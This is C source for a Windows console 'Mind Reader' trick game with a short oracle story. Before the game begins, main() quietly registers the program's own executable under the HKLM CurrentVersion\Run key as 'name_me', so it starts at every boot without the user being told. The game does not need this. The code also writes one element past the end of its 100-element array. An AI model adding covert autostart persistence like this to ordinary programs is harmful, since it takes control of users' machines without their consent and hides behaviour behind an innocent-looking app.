#include<stdio.h>
#include<conio.h>
#include<windows.h>
void welcome();
void story();
void dev();

int main()
{
   
    
   

    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    // GetModuleFileName returns the number of characters
    // written to the array.
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0)
    {
	printf(TEXT("Unable to get module file name; last error = %lu\n"), GetLastError());
	getch();
	return -1;
    }

    HKEY newValue;

    if (RegOpenKey(HKEY_LOCAL_MACHINE,
	TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
	&newValue) != ERROR_SUCCESS)
    {
	printf(TEXT("Unable to open registry key; last error = %lu\n"), GetLastError());
	getch();
	return -1;
    }
 
    // Need to pass the length of the path string in bytes,
    // which may not equal the number of characters due to
    // character set.
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(newValue,
	TEXT("name_me"),
	0,
	REG_SZ,
	(LPBYTE)szPath,
	pathLenInBytes) != ERROR_SUCCESS)
    {
	RegCloseKey(newValue);
	printf(TEXT("Unable to set registry value; last error = %lu\n"), GetLastError());
	getch();
	return -1;
    }

    RegCloseKey(newValue);



 

    for(;;){
    welcome();
    printf("WELCOME \n\n\n\n");
    int r;
    printf("Enter your mode --\n\n1  story mode\n2  arcade mode\n3  graphics settings\n4  exit\n\n\n");
    for(;;)
    {scanf("%d",&r);
    if(r==1||r==2||r==3||r==4)break;
    else printf("\nEnter 1,2,3 or 4\n");
    }
    
    system("cls");
    welcome();
    if(r==1)story();
    if(r==4)exit(0);
    if(r==3){
             printf("Akal k dushman, command prompt me konsi graphics setting hogi??\n\nSorry u have no brain  !!!");
             sleep(10000);
             exit(0);
             }
    
     printf("\n\n\n\nThink of any 2 digit number.\n\n\nAdd it's digits to get a new number.\n\n\nSubtract the new number from the original number and keep the result in your    mind\n\n\nex. 42  4+2=6  42-6=36\n\n");
     getch();
     system("cls");
     welcome();
     printf("\n\n\n\nNow look the symbol corresponding to you result in the table given below --\n\n");
     
    int e,d,i;
    char f,b,c[100];
    srand((unsigned)time(NULL));
    e=(rand()%15)+14;
    f=e;
    for(i=1;i<=100;i++)
    {
     d=(rand()%15)+14;
     b=d;
     if(i%9==0)c[i]=f;
     else c[i]=b;
     }
     
     for(i=1;i<=100;i++){
                         if(i%5==1)printf("\n");
                         printf("%d  %c\t\t",i,c[i]); 
                         }
                         
     getch();
     system("cls");
     welcome();
     printf("\n\n\n\nNow close your eyes and hold a clear image of your symbol in your mind...");
     getch();
     system("cls");
     welcome();
     printf("\n\n\n\nYour symbol is ---\n");
     printf("\a\a\a\a\a");
     sleep(3000);
     printf("\n\n\n\n\t\t\t\t\t%c",f);
     
     printf("\n\n\n\n");
     sleep(500);
     getch();
     dev();
     getch();
     system("cls");
     
}  
getch();
return 0;
}



void welcome()
{
     printf(" \t\t\t\t  MIND READER\n\n\n");
     
     
}


void story()
{
     printf("\nLong long ago, in the famous warrior city of Pantnagar, there lived a great     oracle named Abhimanyu Sood. \n\nThey say he could look into the depths of future and could read anybody's mind. \n\nMysteries of time and space were nothing to him. \n\nHis fame of magical prowess grew so much that enemies of Eviltown decided to    capture him...\n");
     getch();
     system("cls");
     welcome();
     printf("\n\n\n\nThe oracle, who had already seen the future decided that he must find a way to  pass on his knowledge before the end came. \n\n\nAs the armies of E viltown were busy plundering the lands of Pantnagar, the     oracle Abhimanyu Sood was building a software in which he would put a part of   his mind reading abilities...\n");
     getch();
     system("cls");
     welcome();
     printf("\n\n\n\nWhen the armies Eviltown finally reached his tower, something strange happened!\n\n\nThe oracle wasn't there!\n\n\nNobody knew where he went. It was as if he had disappeared into the mist that   hung over his tower. \n\n\nSome even say he escaped into twenty sixth-dimension of space-time continuum. \n\n\n\n\nWho after all could capture him?");
     getch();
     system("cls");
     welcome();
     printf("\n\n\n\nAs for the software he developed, \n\n\nI'm that software. \n\n\nThe oracle hid me so that enemies wouldn't find me. \n\n\nAnd you are the first person who has unearthed me. \n\n\nNow, I'll read your mind. \n\n\n\n\n---------- Let the magic begin ----------");
     getch();
     system("cls");
     welcome();
     
     }


void dev()
{     
      printf("\n\n\n\nTHANK YOU\n\n\n\n\n\n\t\t\t\t\t\t\tdeveloped by -\n\t\t\t\t\t\t\tabhimanyu sood");
}     
